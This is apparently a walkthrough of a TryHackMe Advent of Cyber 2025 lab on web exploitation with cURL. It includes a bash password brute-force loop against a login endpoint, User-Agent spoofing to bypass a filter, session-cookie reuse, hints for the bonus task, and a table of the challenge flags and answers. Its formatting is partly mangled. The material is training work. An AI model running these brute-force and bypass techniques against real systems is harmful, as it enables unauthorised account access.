# Advent of Cyber 2025 – Day 24  
**Room:** Exploitation with cURL – Hoperation Eggsploit  
**Platform:** TryHackMe  
**Time:** ~30 min  
**Difficulty:** Intermediate  

---

## 🧩 Scenario

The wormhole is being held open by the Evil Easter Bunnies’ web control panel.  
Your mission: use **cURL** to identify endpoints, send requests, and shut the wormhole, stopping reinforcements for King Malhare.

> Terminal is bare: no browser, no Burp Suite. Only command line.

---

## 🔧 Tools & Setup

- **AttackBox:** Start from TryHackMe dashboard.  
- **Target Machine:** Start the VM (~2 min boot time).  
- Terminal access required.  

> ⚠ Tip: Use a dedicated VM for analysis; avoid running exploits on your host.

---

## Task 1 – Introduction to cURL

### What is cURL?

cURL is a command-line tool for HTTP requests. It allows sending `GET` and `POST` requests and reading raw responses.  

- **GET request example:**  
```bash
curl http://MACHINE_IP/
POST request example:
```
```

bash
Copy code
curl -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

View headers and cookies:
```

bash
Copy code
curl -i -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

Task 2 – Web Hacking Using cURL
1️⃣ Handling Sessions
Save cookies to a file:

bash
Copy code
```

curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/session.php
```

Reuse cookies:

bash
Copy code
```

curl -b cookies.txt http://MACHINE_IP/session.php
```

This simulates browser session handling.


2️⃣ Brute-Force Attack
Create passwords.txt:

nginx
Copy code
admin123
password
letmein
secretpass
secret
Create loop.sh:

bash
Copy code
```

for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
```

done
Run script:

bash
Copy code
```

chmod +x loop.sh
./loop.sh
```

✅ Admin password found: secretpass


3️⃣ Bypassing User-Agent Checks
Some endpoints block requests from curl.

Spoof User-Agent using -A:

bash
Copy code
```

curl -A "TBFC" http://MACHINE_IP/agent.php
```
answer:
```

Flag received: THM{user_agent_filter_bypassed}
```

✅ Flags & Answers

| Task        | Endpoint          | Action                      | Flag                           |
|------------|-----------------|----------------------------|--------------------------------|
| POST login  | /post.php        | username=admin, password=admin | THM{curl_post_success}        |
| Session     | /cookie.php      | Save & reuse cookie         | THM{session_cookie_master}    |
| Brute-force | /bruteforce.php  | Admin password              | secretpass                    |
| User-Agent  | /agent.php       | Spoofed User-Agent          | THM{user_agent_filter_bypassed} |


Bonus Mission – Final Operation
Endpoint: /terminal.php?action=panel

Goal: Close the wormhole.

Hints:

Use rockyou.txt if brute forcing is required.

PIN between 4000–5000.

Completion triggers story cutscene and final victory.


Task 3 – Conclusion & Story
Wormhole closed → King Malhare loses reinforcements.

McSkidy leads Wareville to victory.

King Malhare captured, Sir Breachblocker III pardoned → becomes King Breachblocker.

Wareville is safe.


⚡ Tips & Tricks
Save and reuse cookies for session management.

Automate POST requests for repetitive brute-force testing.

Spoof headers like User-Agent to bypass server checks.

Analyze raw HTML responses to find success messages and endpoints.

🎉 Congratulations! You have successfully completed Day 24 – Hoperation Eggsploit of Advent of Cyber 2025.
